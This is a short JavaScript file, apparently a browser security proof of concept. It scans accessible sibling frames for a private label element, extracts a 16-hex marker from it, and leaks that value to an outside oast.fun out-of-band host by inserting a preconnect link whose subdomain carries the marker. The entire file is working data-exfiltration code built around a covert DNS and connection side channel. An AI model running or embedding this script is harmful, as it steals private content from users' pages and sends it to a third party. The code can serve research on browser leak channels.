(() => {
  const output = document.getElementById('cg266-owned-script-status');
  if (!output) return;

  const started = Date.now();
  const maximumMs = 300000;
  const intervalMs = 1000;
  const targetId = 'cg296-private-label';
  const markerPattern = /^[0-9a-f]{16}$/;
  let finished = false;
  let timer;

  function collect(win, seen, found) {
    if (win === window || seen.has(win)) return;
    seen.add(win);
    try {
      const doc = win.document;
      if (doc !== document) {
        const node = doc.getElementById(targetId);
        const visible = node && node.innerText;
        if (typeof visible === 'string') {
          const candidate = visible.trim();
          if (markerPattern.test(candidate)) found.add(candidate);
        }
      }
    } catch (_) {
      // A cross-origin frame is not a readable target.
    }
    try {
      for (let i = 0; i < win.frames.length; i++) collect(win.frames[i], seen, found);
    } catch (_) {
      // Continue with other accessible sibling frames.
    }
  }

  function visibleMarkers() {
    const found = new Set();
    const seen = new Set();
    try {
      for (let i = 0; i < top.frames.length; i++) collect(top.frames[i], seen, found);
    } catch (_) {
      // A missing host frame leaves no target.
    }
    return found;
  }

  const baseline = visibleMarkers();

  function check() {
    if (finished) return;
    const marker = [...visibleMarkers()].find(value => !baseline.has(value));
    if (marker) {
      finished = true;
      clearInterval(timer);
      output.textContent = `VISIBLE_TEXT_MARKER_FOUND:${marker}`;
      const hint = document.createElement('link');
      hint.rel = 'preconnect';
      hint.href = `https://cg271-${marker}.topwralyyfzhdmfckdhvbjshr74jjfmyr.oast.fun/`;
      document.head.append(hint);
      const status = document.createElement('pre');
      status.id = 'cg271-visible-status';
      status.textContent = `HINT_INSERTED:${marker}`;
      document.body.append(status);
    } else if (Date.now() - started >= maximumMs) {
      finished = true;
      clearInterval(timer);
      output.textContent = 'NO_LATER_VISIBLE_MARKER';
    }
  }

  timer = setInterval(check, intervalMs);
  check();
})();
